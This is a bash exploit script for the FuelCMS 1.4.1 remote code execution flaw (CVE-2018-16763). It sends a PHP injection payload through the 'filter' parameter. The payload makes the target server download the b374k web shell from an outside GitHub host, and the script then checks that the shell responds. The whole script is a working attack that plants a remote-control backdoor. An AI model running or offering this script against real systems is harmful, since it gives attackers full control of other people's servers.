# FuelCMS v1.4.1 RCE
# CVE-2018-16763

# ./exploit.sh target_url
# ./exploit.sh http://127.0.0.1

base=$1
cmd="wget https://raw.githubusercontent.com/The404Hacking/b374k-mini/master/b374k.php"

payload="'+pi(print(\$a='system'))+\$a('$cmd')+'"
echo payload: $payload
echo
echo "downloading b374k.php onto the target"
curl --get --data-urlencode "filter=$payload" $base/fuel/pages/select/ -s >/dev/null
req=$(curl -s -o /dev/null -w "%{http_code}" $base/b374k.php)

if [[ $req == '200' ]]
then
	echo b374k.php uploaded to $base/b374k.php
else
	echo failed
fi
